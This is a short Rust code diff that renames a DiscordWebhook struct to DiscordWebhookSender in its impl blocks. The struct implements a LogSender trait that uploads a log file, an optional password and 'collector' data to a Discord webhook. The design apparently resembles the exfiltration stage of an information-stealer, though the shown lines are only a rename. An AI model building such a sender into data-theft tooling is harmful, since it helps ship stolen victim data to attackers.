@@ -10,7 +10,7 @@ use requests::{write_file_field, write_text_field, BodyRequestBuilder, Multipart
 use utils::format_size;
 
 #[derive(Clone, new)]
-pub struct DiscordWebhook {
+pub struct DiscordWebhookSender {
     webhook: Arc<str>
 }
 
@@ -100,7 +100,7 @@ where
     }
 }
 
-impl DiscordWebhook {
+impl DiscordWebhookSender {
     fn send_multipart(&self, builder: MultipartBuilder) -> Result<(), SendError> {
         let content_type = builder.content_type();
         let body = builder.finish();
@@ -117,7 +117,7 @@ impl DiscordWebhook {
     }
 }
 
-impl LogSender for DiscordWebhook {
+impl LogSender for DiscordWebhookSender {
     fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
     where
         P: AsRef<str> + Clone,
